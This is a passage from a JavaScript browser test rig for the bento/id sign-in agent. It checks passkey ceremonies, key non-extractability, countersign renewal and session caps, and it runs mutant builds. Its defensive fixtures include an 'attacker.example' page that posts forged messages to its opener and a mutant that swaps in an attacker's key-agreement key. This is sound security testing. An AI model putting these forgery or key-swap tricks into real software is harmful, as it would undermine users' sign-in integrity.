// SPDX-License-Identifier: MIT
// Copyright (c) 2026 The Bento authors
// The bento/id agent of bento/home in your browser (home/web/src/identity.ts),
// in a real browser, against the REAL library build and the REAL sign-in host.
//
//   node scripts/test-home-web-identity.mjs              # Playwright's headless shell
//   node scripts/test-home-web-identity.mjs --chrome     # the installed Google Chrome
//   node scripts/test-home-web-identity.mjs --mutants    # each mutant, red on its row
//   node scripts/test-home-web-identity.mjs --mutants <name>
//
// Every origin is routed in-process. https://home.bento.page is the library
// built with --identity (home/web/build.mjs) and served with its own _headers;
// https://signin.id.bento.page is the real worker and files
// (server/signin/local.mjs) with a CDP virtual authenticator holding the
// person's passkey; https://id.bento.page is scripts/lib/id-web-directory-stub.mjs,
// the contract the directory's routes must match, built on the kernel. Every
// other request is refused and every WebSocket closed; the rig fails if any
// was attempted. Time is the browser's clock (Playwright's) and the stub's,
// moved together.
//
// Each row is a fresh browser context (an empty IndexedDB). Each rule has a
// MUTANT: a library built with one edit that breaks it (or the built page with
// its policy loosened), under which its row must go red. A mutant whose edit
// no longer applies fails the build, so the rig.
import { spawnSync } from 'node:child_process'
import { cpSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { siteHandler } from '../server/signin/local.mjs'
import { parseHeaders } from '../home/web/serve.mjs'
import { directoryStub, HOME, SIGNIN as S } from './lib/id-web-directory-stub.mjs'
import { K, chainOf, ADDRESS, T, H as HOUR, assertion as softAssertion } from './lib/roster-build.ts'
import { verifyRosterChain, ROSTER_RP_ID, ROSTER_WEB_ORIGINS } from '../kernel/src/roster.ts'
import { verifyDevice, CEREMONY_CAP_MS, buildDeviceCert, buildWren } from '../kernel/src/devices.ts'
import { b64uEnc, sha256b64u, signStatement } from '../kernel/src/statements.ts'

const { chromium } = await import(process.env.PLAYWRIGHT_MODULE || 'playwright')
const ROOT = fileURLToPath(new URL('..', import.meta.url))
const CHROME = process.argv.includes('--chrome')
const MUTANTS_RUN = process.argv.includes('--mutants')
const ONLY = MUTANTS_RUN ? process.argv[process.argv.indexOf('--mutants') + 1] : undefined
const DIR = 'https://id.bento.page', ATTACKER = 'https://attacker.example'
const DAY = 24 * HOUR
const T0 = T + 40 * DAY

let checks = 0, failures = 0
const ok = (c, m) => { checks++; if (!c) { failures++; console.log(`  FAIL  ${m}`) } else console.log(`  ok    ${m}`) }

// ---- the people and the directory ---------------------------------------------------
// The passkey is roster-build's pk1, so the chains are the kernel fixtures' chains.
const BOB = 'bob@example.com'
const specs = (address, extra = {}) => [
  { address, members: [['pk', 'pk1']], req: T0 - 30 * DAY, rip: T0 - 30 * DAY, ...extra },
  { address, members: [['pk', 'pk1'], ['pk', 'pk2']], req: T0 - 23 * DAY, rip: T0 - 20 * DAY, signer: 'pk1', ...extra },
]
const accounts = new Map([[ADDRESS, await chainOf(specs(ADDRESS))], [BOB, await chainOf(specs(BOB))]])
// the same chain, countersigned by a key the build does not pin
const ROGUE = { kid: 'dir-9', key: K.dirOther.key, pub: K.dirOther.pub, links: await chainOf(specs(ADDRESS, { kid: 'dir-9', ripBy: 'dirOther' })) }
const PINNED = { 'dir-1': K.dir1.pub }
const CRED = Buffer.from('alice-passkey-01')
const credentials = new Map([[CRED.toString('base64url'), K.pk1.pub]])
// pk1's private key for the virtual authenticator (roster-build derives it the same way)
const pk1Pkcs8 = await (async () => {
  const d = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode('bento/id/roster/v1/test/pk1')))
  const raw = Buffer.from(K.pk1.pub, 'base64url')
  const jwk = { kty: 'EC', crv: 'P-256', d: b64uEnc(d), x: b64uEnc(raw.subarray(1, 33)), y: b64uEnc(raw.subarray(33)), ext: true }
  const k = await crypto.subtle.importKey('jwk', jwk, { name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign'])
  return Buffer.from(await crypto.subtle.exportKey('pkcs8', k)).toString('base64')
})()
const EVIL_KX = b64uEnc(new Uint8Array(await crypto.subtle.exportKey('raw', (await crypto.subtle.generateKey({ name: 'ECDH', namedCurve: 'P-256' }, true, ['deriveBits'])).publicKey)))

// ---- builds ---------------------------------------------------------------------------
const tmp = mkdtempSync(join(tmpdir(), 'home-web-identity-'))
const keysFile = join(tmp, 'directory-keys.json')
writeFileSync(keysFile, JSON.stringify(PINNED))
function build(name, edits) {
  const out = join(tmp, name)
  const r = spawnSync(process.execPath, [join(ROOT, 'home/web/build.mjs'), '--dev', '--identity', '--directory-keys', keysFile,
    '--frame-origin', 'https://frame.example', '--out', out], { encoding: 'utf8', env: { ...process.env, ...(edits ? { BENTO_HOME_WEB_MUTANT: JSON.stringify(edits) } : {}) } })
  if (r.status !== 0) throw new Error(`build ${name} failed: ${r.stderr}`)
  return out
}
/** The built page with its policy edited (the meta CSP and the header alike). */
function distMutant(from, name, edit) {
  const out = join(tmp, name)
  cpSync(from, out, { recursive: true })
  for (const f of ['library/index.html', 'library/_headers']) {
    const p = join(out, f), t = readFileSync(p, 'utf8'), e = edit(t)
    if (e === t) throw new Error(`dist mutant ${name}: the edit does not apply to ${f}`)
    writeFileSync(p, e)
  }
  return out
}

// ---- the sign-in host, honest or with one edit ------------------------------------------
const SIGNIN_ROOT = join(ROOT, 'server/signin')
let sTag = 0
async function signinSite(edit) {
  if (!edit) return siteHandler(SIGNIN_ROOT)
  const dir = join(tmp, `signin-${++sTag}`)
  cpSync(SIGNIN_ROOT, dir, { recursive: true })
  const f = join(dir, edit[0]), t = readFileSync(f, 'utf8')
  if (t.split(edit[1]).length !== 2) throw new Error(`sign-in host edit does not apply once: ${edit[1]}`)
  writeFileSync(f, t.replace(edit[1], () => edit[2]))
  return siteHandler(dir, 's' + sTag)
}
// the sign-in host writes another key-agreement key into the certificate than the one bento/home sent
const S_SWAP_KX = ['public/signin.js', 'wdevText({ W: request.W, kx: request.kx,', `wdevText({ W: request.W, kx: '${EVIL_KX}',`]

// ---- the browser ------------------------------------------------------------------------
const browser = await chromium.launch({ ...(CHROME ? { channel: 'chrome' } : {}), headless: true })
console.log(`${CHROME ? 'Google Chrome' : 'Playwright headless shell'} ${browser.version()}`)
const sockets = [], refused = []

const FORGE = `<!doctype html><meta charset=utf-8><title>forge</title><script>
  opener && opener.postMessage({ t: 'cancelled' }, '*')
  opener && opener.postMessage({ t: 'failed' }, '*')
</script>`

/** A fresh browser context: every origin routed, the clock at T0, the sign-in host's account set. */
async function session(dist, { sEdit = null, account = ADDRESS } = {}) {
  const ctx = await browser.newContext()
  const st = { ctx, base: T0, setAt: Date.now(), wa: [], attackerHits: [], auth: new Map(), page: null }
  await ctx.clock.install({ time: T0 })
  st.now = () => st.base + (Date.now() - st.setAt)
  st.setTime = async (t) => { st.base = t; st.setAt = Date.now(); await ctx.clock.setSystemTime(t) }
  st.dir = directoryStub({ accounts, credentials, key: { kid: 'dir-1', key: K.dir1.key }, now: st.now })
  const s = await signinSite(sEdit)
  // the library build served; a row may switch it (st.serve) to load what another build left behind
  st.serve = (d) => {
    st.libRules = parseHeaders(readFileSync(join(d, 'library/_headers'), 'utf8'))
    st.libHtml = readFileSync(join(d, 'library/index.html'))
  }
  st.serve(dist)

  await ctx.routeWebSocket(/.*/, (ws) => { sockets.push(ws.url()); ws.close() })
  await ctx.route('**/*', (route) => { refused.push(route.request().url()); return route.abort() })
  await ctx.route(`${HOME}/**`, (route) => {
    const p = new URL(route.request().url()).pathname
    if (p !== '/' && p !== '/index.html') return route.fulfill({ status: 404, body: '' })
    const headers = { 'content-type': 'text/html; charset=utf-8' }
    for (const r of st.libRules) if (r.pattern === p) for (const [k, v] of r.headers) headers[k.toLowerCase()] = v
    return route.fulfill({ status: 200, headers, body: st.libHtml })
  })
  await ctx.route(`${S}/**`, async (route) => {
    const res = await s(new Request(route.request().url(), { method: route.request().method() }))
    return route.fulfill({ status: res.status, headers: Object.fromEntries(res.headers), body: Buffer.from(await res.arrayBuffer()) })
  })
  await ctx.route(`${DIR}/**`, async (route) => {
    const r = route.request()
    const a = await st.dir.handle({ method: r.method(), path: new URL(r.url()).pathname, origin: r.headers().origin, body: r.postData() })
    return route.fulfill({ status: a.status, headers: a.headers, body: a.body })
  })
  await ctx.route(`${ATTACKER}/**`, (route) => {
    st.attackerHits.push(route.request().url())
    return route.fulfill({ contentType: 'text/html', body: FORGE })
  })
  // every WebAuthn and Signal API call, from any page, recorded by origin (CDP-injected: no page policy applies)
  await ctx.exposeBinding('__waLog', ({ frame }, name) => { st.wa.push({ origin: new URL(frame.url()).origin, name }) })
  await ctx.addInitScript(() => {
    const log = (n) => { try { window.__waLog(n) } catch {} }
    const C = navigator.credentials
    if (C) for (const m of ['get', 'create', 'store']) { const f = C[m] && C[m].bind(C); if (f) C[m] = (...a) => { log('credentials.' + m); return f(...a) } }
    const P = window.PublicKeyCredential
    if (P) for (const m of ['signalAllAcceptedCredentials', 'signalUnknownCredential', 'signalCurrentUserDetails']) {
      const f = typeof P[m] === 'function' ? P[m].bind(P) : null
      P[m] = (a) => { log(m); return f ? f(a) : Promise.reject(new TypeError('absent')) }
    }
  })
  ctx.on('page', (p) => {
    st.auth.set(p, (async () => {
      const c = await ctx.newCDPSession(p)
      await c.send('WebAuthn.enable')
      const { authenticatorId } = await c.send('WebAuthn.addVirtualAuthenticator', { options: { protocol: 'ctap2', ctap2Version: 'ctap2_1', transport: 'internal', hasResidentKey: true, hasUserVerification: true, isUserVerified: true, automaticPresenceSimulation: true } })
      await c.send('WebAuthn.addCredential', { authenticatorId, credential: { credentialId: CRED.toString('base64'), isResidentCredential: true, rpId: 'id.bento.page', privateKey: pk1Pkcs8, userHandle: Buffer.from('acct-alice').toString('base64'), signCount: 0 } })
    })().catch((e) => console.log('  cdp', e.message)))
  })
  await setAccount(st, account)
  st.page = await ctx.newPage()
  await st.page.goto(HOME + '/')
  await settled(st)
  return st
}
const close = (st) => st.ctx.close()

/** The sign-in host's own storage, as its pages leave it (page.evaluate is not bound by the page's policy). */
async function setAccount(st, a) {
  const p = await st.ctx.newPage()
  await p.goto(S + '/')
  await p.evaluate((x) => { if (x) localStorage.setItem('bento-id-account', x); else localStorage.removeItem('bento-id-account') }, a)
  await p.close()
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const until = async (fn, ms = 8000) => { const t = Date.now(); for (;;) { const v = await fn().catch(() => undefined); if (v) return v; if (Date.now() - t > ms) return v; await sleep(50) } }
const box = (st) => st.page.evaluate(() => {
  const b = document.getElementById('id-box'), a = document.getElementById('id-act')
  return { ready: b.dataset.ready === '1', state: b.dataset.state || '', why: b.dataset.why || '', reason: b.dataset.reason || '', hidden: b.hidden,
    text: document.getElementById('id-text').textContent, act: a.hidden ? null : a.textContent, out: !document.getElementById('id-out').hidden }
})
const settled = (st, not = ['', 'working']) => until(async () => { const b = await box(st); return b.ready && !b.hidden && !not.includes(b.state) && b })
const reload = async (st) => { await st.page.reload(); return settled(st) }
const popState = (p) => p.evaluate(() => document.body.dataset.state).catch(() => 'closed')

/** Click the identity button; the popup reaches consent (or a refusal); approve unless told not to. */
async function ceremony(st, { approve = true, during } = {}) {
  const now = await box(st)
  if (now.act === null) return { pop: null, ps: 'no-button', label: null, box: now }
  const [pop] = await Promise.all([st.ctx.waitForEvent('page'), st.page.click('#id-act')])
  await st.auth.get(pop)
  await pop.waitForLoadState().catch(() => {})
  const ps = await until(async () => { const s = await popState(pop); return ['consent', 'refused', 'no-account'].includes(s) && s })
  let label = null
  if (ps === 'consent') label = await pop.locator('#label').innerText()
  if (during) await during(pop)
  else if (approve && ps === 'consent') await pop.click('#approve')
  const b = await settled(st)
  return { pop, ps, label, box: b }
}

/** What the library holds in IndexedDB, read in the page. */
const held = (st) => st.page.evaluate(() => new Promise((res) => {
  const r = indexedDB.open('bento-id')
  r.onsuccess = () => {
    const db = r.result
    if (!db.objectStoreNames.contains('agent')) return res({ held: null, last: null, keys: [] })
    const t = db.transaction('agent')
    const s = t.objectStore('agent'), g = s.get('held'), l = s.get('last'), k = s.getAllKeys()
    t.oncomplete = async () => {
      const h = g.result
      const ex = async (key) => { try { await crypto.subtle.exportKey('pkcs8', key); return 'exported' } catch (e) { return e.name } }
      const jwk = async (key) => { try { await crypto.subtle.exportKey('jwk', key); return 'exported' } catch (e) { return e.name } }
      res({
        keys: k.result, last: l.result ?? null,
        held: h ? {
          address: h.address, label: h.label, Wpub: h.Wpub, kxPub: h.kxPub, cert: h.cert, signer: h.signer, assertion: h.assertion,
          watt: h.watt, wattSig: h.wattSig, ceremonyAt: h.ceremonyAt, expires: h.expires, roster: h.roster, pin: h.pin ?? null,
          W: { ext: h.W.privateKey.extractable, alg: h.W.privateKey.algorithm.name, curve: h.W.privateKey.algorithm.namedCurve, usages: h.W.privateKey.usages, pkcs8: await ex(h.W.privateKey), jwk: await jwk(h.W.privateKey) },
          kx: { ext: h.kx.privateKey.extractable, alg: h.kx.privateKey.algorithm.name, curve: h.kx.privateKey.algorithm.namedCurve, usages: h.kx.privateKey.usages, pkcs8: await ex(h.kx.privateKey), jwk: await jwk(h.kx.privateKey) },
        } : null,
      })
    }
  }
  r.onerror = () => res({ held: null, last: null, keys: [] })
}))

const homeWa = (st) => st.wa.filter((x) => x.origin === HOME)

// ---- the build that plants exportable keys, and the agent in node ----------------------------
let planting = null
const plantingBuild = () => (planting ??= build('planting', MUTANTS['keys-extractable'][1]))

const ESBUILD = process.env.ESBUILD || join(ROOT, 'slides/node_modules/.bin/esbuild')
let agentN = 0
/**
 * home/web/src/identity.ts, with `edits` applied in a copy beside the real src
 * (so its kernel imports resolve), bundled: for node (esm), or for a page
 * (an iife exposing the agent, the real IndexedDB store, and the kernel
 * builders a page needs to make a held record, as `window.B`).
 */
function bundleAgent(edits, page) {
  const copy = join(ROOT, `home/web/.identity-node-${process.pid}-${++agentN}`)
  cpSync(join(ROOT, 'home/web/src'), copy, { recursive: true })
  try {
    for (const e of edits ?? []) {
      const f = join(copy, e.file), t = readFileSync(f, 'utf8')
      if (t.split(e.from).length !== 2) throw new Error(`edit does not apply once in ${e.file}: ${e.from}`)
      writeFileSync(f, t.replace(e.from, () => e.to))
    }
    let entry = join(copy, 'identity.ts')
    if (page) {
      entry = join(copy, 'rig-page-entry.ts')
      writeFileSync(entry, `export { Agent, indexedStore } from './identity.ts'
export { buildDeviceCert, buildWren } from '../../../kernel/src/devices.ts'
export { b64uEnc, signStatement, sha256b64u } from '../../../kernel/src/statements.ts'\n`)
    }
    const out = join(tmp, `agent-${agentN}.${page ? 'js' : 'mjs'}`)
    const r = spawnSync(ESBUILD, [entry, '--bundle', `--format=${page ? 'iife' : 'esm'}`, ...(page ? ['--global-name=B'] : ['--platform=neutral']),
      '--log-level=error', `--define:__DIRECTORY_KEYS__=${JSON.stringify(PINNED)}`, `--outfile=${out}`], { encoding: 'utf8' })
    if (r.status !== 0) throw new Error(`esbuild: ${r.stderr}`)
    return out
  } finally { rmSync(copy, { recursive: true, force: true }) }
}
const agentModule = async (edits) => import(bundleAgent(edits, false))

// ---- the real store: two pages of one browser context share its IndexedDB ------------------
// In each page: the agent, the real indexedStore, and helpers that make a held
// record through the stub (window.seed) and read the store back.
const PAGE_HELPERS = `
window.CLOCK = 0
window.net = async (url, init) => { const r = await window.__dir(new URL(url).pathname, ${JSON.stringify(HOME)}, init.body); return new Response(r.body, { status: r.status }) }
const raw = async (k) => B.b64uEnc(new Uint8Array(await crypto.subtle.exportKey('raw', k)))
window.seed = async () => {
  const W = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, false, ['sign'])
  const kx = await crypto.subtle.generateKey({ name: 'ECDH', namedCurve: 'P-256' }, false, ['deriveBits'])
  const Wpub = await raw(W.publicKey), kxPub = await raw(kx.publicKey)
  const ch = JSON.parse((await window.__dir('/v1/web/challenge', ${JSON.stringify(S)}, JSON.stringify({ address: ${JSON.stringify(ADDRESS)} }))).body)
  const text = B.buildDeviceCert({ kind: 'wdev', devicePub: Wpub, consentPub: null, kx: kxPub, address: ${JSON.stringify(ADDRESS)}, rosHash: ch.rosHash, label: 'Chrome on macOS', via: 'passkey', ceremonyAt: ch.at, dirNonce: ch.nonce })
  const a = await window.__assert(text)
  const e = await window.__dir('/v1/web/enrol', ${JSON.stringify(S)}, JSON.stringify({ text, rq: ${JSON.stringify(HOME)}, assertion: { id: ${JSON.stringify(CRED.toString('base64url'))}, ...a } }))
  if (e.status !== 200) throw new Error('enrol ' + e.body)
  const nonce = JSON.parse((await window.__dir('/v1/home/challenge', ${JSON.stringify(HOME)}, JSON.stringify({ address: ${JSON.stringify(ADDRESS)} }))).body).nonce
  const wren = B.buildWren({ devicePub: Wpub, address: ${JSON.stringify(ADDRESS)}, challenge: nonce })
  const p = JSON.parse((await window.__dir('/v1/home/checkin', ${JSON.stringify(HOME)}, JSON.stringify({ wren, sig: await B.signStatement(W.privateKey, wren) }))).body)
  let from = 0
  for (let i = 0; i < p.roster.length; i++) if ((await B.sha256b64u(p.roster[i].ros)) === ch.rosHash) from = i
  // what a ceremony writes: unconditionally
  await B.indexedStore.put({ v: 1, address: ${JSON.stringify(ADDRESS)}, label: 'Chrome on macOS', W, kx, Wpub, kxPub, cert: text, signer: p.signer,
    assertion: p.assertion, watt: p.watt, wattSig: p.wattSig, ceremonyAt: ch.at, expires: window.CLOCK + 24 * 3600e3, roster: p.roster.slice(from), pin: ch.rosHash })
  return Wpub
}
window.stored = async () => { const r = await B.indexedStore.get(); return { W: r.held ? r.held.Wpub : null, last: r.last ? r.last.why : null } }
window.newAgent = async (store) => { window.agent = new B.Agent(store || B.indexedStore, window.net, () => window.CLOCK); return (await window.agent.load()).kind }
window.mem = () => window.agent.held ? window.agent.held.Wpub : null
`
/** One browser context, two pages (two tabs of the library), the agent bundled with `edits`. */
async function twoTabs(edits) {
  const src = readFileSync(bundleAgent(edits, true), 'utf8')
  const ctx = await browser.newContext()
  await ctx.routeWebSocket(/.*/, (ws) => { sockets.push(ws.url()); ws.close() })
  await ctx.route('**/*', (route) => { refused.push(route.request().url()); return route.abort() })
  await ctx.route(HOME + '/', (route) => route.fulfill({ status: 200, headers: { 'content-type': 'text/html' }, body: '<!doctype html><title>tab</title>' }))
  await ctx.exposeFunction('__dir', async (path, origin, body) => { const r = await raceDir.handle({ method: 'POST', path, origin, body }); return { status: r.status, body: r.body } })
  await ctx.exposeFunction('__assert', (text) => softAssertion('pk1', text, { origin: S }))
  const tab = async () => {
    const p = await ctx.newPage()
    await p.goto(HOME + '/')
    await p.addScriptTag({ content: src })
    await p.addScriptTag({ content: PAGE_HELPERS })
    await p.evaluate((c) => { window.CLOCK = c }, raceClock)
    return p
  }
  return { ctx, a: await tab(), b: await tab() }
}


// a directory and a clock of its own, for the node rows
let raceClock = T0 + HOUR
const raceDir = directoryStub({ accounts, credentials, key: { kid: 'dir-1', key: K.dir1.key }, now: () => raceClock })
const call = async (path, origin, body) => { const r = await raceDir.handle({ method: 'POST', path, origin, body: JSON.stringify(body) }); return { status: r.status, body: JSON.parse(r.body) } }
const rawPub = async (k) => b64uEnc(new Uint8Array(await crypto.subtle.exportKey('raw', k)))
/** A held record as a finished ceremony leaves it: enrolled through the stub's sign-in routes, its proof fetched by a check-in. */
async function heldRecord() {
  const W = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, false, ['sign'])
  const kx = await crypto.subtle.generateKey({ name: 'ECDH', namedCurve: 'P-256' }, false, ['deriveBits'])
  const Wpub = await rawPub(W.publicKey), kxPub = await rawPub(kx.publicKey)
  const ch = (await call('/v1/web/challenge', S, { address: ADDRESS })).body
  const text = buildDeviceCert({ kind: 'wdev', devicePub: Wpub, consentPub: null, kx: kxPub, address: ADDRESS, rosHash: ch.rosHash, label: 'Chrome on macOS', via: 'passkey', ceremonyAt: ch.at, dirNonce: ch.nonce })
  const a = await softAssertion('pk1', text, { origin: S })
  const e = await call('/v1/web/enrol', S, { text, rq: HOME, assertion: { id: CRED.toString('base64url'), ...a } })
  if (e.status !== 200) throw new Error('enrol ' + JSON.stringify(e.body))
  const nonce = (await call('/v1/home/challenge', HOME, { address: ADDRESS })).body.nonce
  const wren = buildWren({ devicePub: Wpub, address: ADDRESS, challenge: nonce })
  const p = (await call('/v1/home/checkin', HOME, { wren, sig: await signStatement(W.privateKey, wren) })).body
  let from = 0
  for (let i = 0; i < p.roster.length; i++) if ((await sha256b64u(p.roster[i].ros)) === ch.rosHash) from = i
  return { v: 1, address: ADDRESS, label: 'Chrome on macOS', W, kx, Wpub, kxPub, cert: text, signer: p.signer, assertion: p.assertion,
    watt: p.watt, wattSig: p.wattSig, ceremonyAt: ch.at, expires: raceClock + 24 * HOUR, roster: p.roster.slice(from), pin: ch.rosHash }
}
/** An agent holding a fresh record, an in-memory store, and a network that fires `fire.hook` as the check-in answer is handed back. */
async function raceSetup(Agent) {
  raceClock = T0 + HOUR
  const fire = { hook: null, onPut: null, failPut: false }
  const store = memoryStore(fire)
  const h0 = await heldRecord()
  await store.put(h0)
  raceClock += HOUR   // so the check-in's countersign differs from the held one
  const net = async (url, init) => {
    const u = new URL(url), r = await raceDir.handle({ method: 'POST', path: u.pathname, origin: HOME, body: init.body })
    if (u.pathname === '/v1/home/checkin' && fire.hook) { const f = fire.hook; fire.hook = null; setImmediate(f) }
    return new Response(r.body, { status: r.status })
  }
  const agent = new Agent(store, net, () => raceClock)
  if ((await agent.load()).kind !== 'signed-in') throw new Error('the seeded record does not load')
  return { agent, store, h0, fire, net }
}
/**
 * The library's store as IndexedDB behaves: a write lands when it is asked
 * for (its transaction is queued first) but is reported a moment later, so
 * whatever runs in between sees the write done and the writer still waiting.
 * A write that names `expect` happens only over the record with that Wpub.
 */
function memoryStore(fire) {
  let rec = { held: null, last: null }
  const later = (v) => new Promise((r) => setTimeout(() => r(v), 5))
  const mine = (expect) => expect === undefined || rec.held?.Wpub === expect
  return {
    rec: () => rec,
    get: async () => rec,
    put: (h, expect) => {
      if (fire.failPut) return Promise.reject(new DOMException('quota', 'QuotaExceededError'))
      const ok = mine(expect)
      if (ok) rec = { held: h, last: null }
      const f = fire.onPut; fire.onPut = null
      if (f) f()
      return later(ok)
    },
    end: (l, expect) => { const ok = mine(expect); if (ok) rec = { held: null, last: l }; return later(ok) },
  }
}

// ---- the rows -------------------------------------------------------------------------------
// Each returns [[condition, message], ...]; a row holds when all of them do.
const ROWS = {
  async 'round trip: the sign-in host certifies a browser key, and the library verifies it with the kernel'(dist) {
    const st = await session(dist)
    const before = await box(st)
    const c = await ceremony(st)
    const h = await held(st)
    const enrol = st.dir.log.filter((x) => x.k === 'enrol'), checkins = st.dir.log.filter((x) => x.k === 'checkin')
    const out = [
      [before.state === 'none' && before.act === 'Sign in', `signed out at first, offering Sign in (${before.state}, ${before.act})`],
      [c.ps === 'consent', `the sign-in host shows its consent screen (${c.ps})`],
      [c.box.state === 'signed-in' && c.box.text.includes(`Signed in as ${ADDRESS} (passkey sign-in).`), `the library says who is signed in: "${c.box.text}"`],
      [!!h.held && h.held.address === ADDRESS && c.label === h.held.label && enrol[0]?.label === h.held.label, `the label the host showed and the directory logged is the one the library chose (${c.label})`],
      [enrol.length === 1 && enrol[0].os === S && enrol[0].rq === HOME && enrol[0].W === h.held?.Wpub && enrol[0].kx === h.held?.kxPub,
        `the directory enrolled exactly the library's W and kx, asked from ${HOME} through ${S}`],
      [checkins.length === 1 && checkins[0].W === h.held?.Wpub && checkins[0].pin === null, 'the library fetched its proof with a check-in signed by the new W, from setup (no pin yet)'],
    ]
    if (h.held) {
      // the same verdict outside the page: the kernel's verifiers over what the library keeps
      const now = st.now()
      const opts = { directoryKeys: PINNED, rpId: ROSTER_RP_ID, origins: ROSTER_WEB_ORIGINS, now }
      const chain = await verifyRosterChain(h.held.roster, { ...opts, pinned: h.held.pin })
      const dv = chain.ok ? await verifyDevice({ cert: h.held.cert, signer: h.held.signer, assertion: h.held.assertion, watt: h.held.watt, wattSig: h.held.wattSig }, { ...opts, roster: chain.value }) : chain
      out.push([dv.ok && dv.value.tier === 'passkey' && dv.value.cert.devicePub === h.held.Wpub && h.held.pin === dv.value.cert.rosHash,
        `what the library keeps verifies under the kernel (roster from its pin, certificate, countersign), tier passkey (${dv.ok ? dv.value.tier : dv.reason})`])
      out.push([h.held.expires === dv.value?.watt.expires && h.held.expires - st.now() <= 24 * HOUR, 'its countersign lasts at most 24 hours'])
    }
    await close(st)
    return out
  },

  async 'W and kx are non-extractable'(dist) {
    const st = await session(dist)
    await ceremony(st)
    const h = (await held(st)).held
    await close(st)
    if (!h) return [[false, 'nothing was held']]
    return [
      [h.W.ext === false && h.W.alg === 'ECDSA' && h.W.curve === 'P-256' && h.W.usages.join() === 'sign', `W: ECDSA P-256, sign only, extractable ${h.W.ext}`],
      [h.kx.ext === false && h.kx.alg === 'ECDH' && h.kx.curve === 'P-256' && h.kx.usages.join() === 'deriveBits', `kx: ECDH P-256, deriveBits only, extractable ${h.kx.ext}`],
      [h.W.pkcs8 === 'InvalidAccessError' && h.W.jwk === 'InvalidAccessError' && h.kx.pkcs8 === 'InvalidAccessError' && h.kx.jwk === 'InvalidAccessError',
        `exporting either private key fails (${h.W.pkcs8}, ${h.W.jwk}, ${h.kx.pkcs8}, ${h.kx.jwk})`],
    ]
  },

  async 'the library runs no WebAuthn and never calls the Signal API'(dist) {
    const st = await session(dist)
    await ceremony(st)
    await st.page.click('#id-out')
    const after = await settled(st, ['', 'working', 'signed-in'])
    const h = await held(st)
    const lib = readFileSync(join(dist, 'library/index.html'), 'utf8')
    const named = ['navigator.credentials', 'credentials.get', 'credentials.create', 'PublicKeyCredential', 'signalAllAcceptedCredentials', 'signalUnknownCredential', 'signalCurrentUserDetails'].filter((n) => lib.includes(n))
    const sCalls = st.wa.filter((x) => x.origin === S).map((x) => x.name)
    await close(st)
    return [
      [sCalls.includes('credentials.get'), `positive control: the sign-in host's own passkey call is seen (${sCalls})`],
      [homeWa(st).length === 0, `the library made no WebAuthn or Signal API call through sign-in and sign-out (${JSON.stringify(homeWa(st))})`],
      [named.length === 0, `the built library names no WebAuthn or Signal API (${named})`],
      [after.state === 'none' && !h.held && !h.last, `sign out forgets this browser's sign-in, and only that (${after.state})`],
    ]
  },

  async 'every ceremony makes fresh keys, and the old ones are gone'(dist) {
    const st = await session(dist)
    await ceremony(st)
    const one = (await held(st)).held
    await st.setTime(T0 + 6 * DAY + HOUR)
    const b = await reload(st)
    const c = await ceremony(st)
    const h = await held(st)
    const two = h.held
    const enrol = st.dir.log.filter((x) => x.k === 'enrol')
    await close(st)
    return [
      [b.state === 'confirm' && c.box.state === 'signed-in' && !!one && !!two, `"Confirm it's you" ran a second ceremony (${b.state} → ${c.box.state})`],
      [!!two && two.Wpub !== one?.Wpub && two.kxPub !== one?.kxPub, 'the second certificate is for a new W and a new kx'],
      [enrol.length === 2 && enrol[0].W !== enrol[1].W && enrol[0].kx !== enrol[1].kx, 'the directory enrolled two different keys'],
      [h.keys.length === 1 && h.keys[0] === 'held' && two?.ceremonyAt > one?.ceremonyAt, `one record is kept, the new one (${h.keys})`],
    ]
  },

  async 'the countersign is renewed by a check-in signed by W'(dist) {
    const st = await session(dist)
    await ceremony(st)
    const one = (await held(st)).held
    await st.setTime(T0 + 20 * HOUR)
    const b = await reload(st)
    const two = (await held(st)).held
    const last = st.dir.log.filter((x) => x.k === 'checkin').at(-1)
    await close(st)
    return [
      [b.state === 'signed-in', `still signed in after 20 hours (${b.state})`],
      [!!two && two.expires >= T0 + 43 * HOUR && two.expires > (one?.expires ?? Infinity), `a fresh countersign: expires +${two ? ((two.expires - T0) / HOUR).toFixed(1) : '?'} h from the ceremony`],
      [!!last && last.W === one?.Wpub && last.pin === one?.pin && last.at >= T0 + 20 * HOUR, 'the check-in was signed by W and read the roster from the pinned head'],
    ]
  },

  async "a day before the 7-day cap the library asks \"Confirm it's you\""(dist) {
    const st = await session(dist)
    await ceremony(st)
    const cer = (await held(st)).held?.ceremonyAt ?? T0
    await st.setTime(cer + 5 * DAY + 22 * HOUR)
    const early = await reload(st)
    await st.setTime(cer + 6 * DAY + HOUR)
    const late = await reload(st)
    await close(st)
    return [
      [early.state === 'signed-in' && early.act === null, `more than a day before the cap: signed in, nothing asked (${early.state})`],
      [late.state === 'confirm' && late.act === 'Confirm it’s you' && /This sign-in ends .*: confirm it’s you to keep it\./.test(late.text), `inside the last day: "${late.text}" [${late.act}]`],
    ]
  },

  async 'past the 7-day cap the sign-in ends'(dist) {
    const st = await session(dist)
    await ceremony(st)
    const cer = (await held(st)).held?.ceremonyAt ?? T0
    await st.setTime(cer + CEREMONY_CAP_MS + HOUR)
    const b = await reload(st)
    const refusedCap = st.dir.log.filter((x) => x.k === 'checkin').length >= 2
    await close(st)
    return [
      [b.state === 'ended' && b.why === 'expired' && b.act === 'Confirm it’s you', `ended, offering "Confirm it's you": "${b.text}"`],
      [refusedCap, 'the check-in was tried and the directory refused it past the cap'],
    ]
  },

  async 'an incident record covering the ceremony ends the sign-in; an earlier one does not'(dist) {
    const st = await session(dist)
    await ceremony(st)
    const cer = (await held(st)).held?.ceremonyAt ?? T0
    st.dir.incidents.push({ id: 'old', from: cer - 10 * DAY, to: cer - HOUR })
    const kept = await reload(st)
    const keptHeld = !!(await held(st)).held
    st.dir.incidents.push({ id: 'now', from: cer - HOUR, to: cer + HOUR })
    const ended = await reload(st)
    const h = await held(st)
    // a new ceremony inside the window is refused too; after it, allowed
    st.dir.incidents.length = 0
    st.dir.incidents.push({ id: 'now', from: cer - HOUR, to: st.now() + HOUR })
    const inside = await ceremony(st)
    await st.setTime(st.now() + 2 * HOUR)
    const after = await ceremony(st)
    await close(st)
    return [
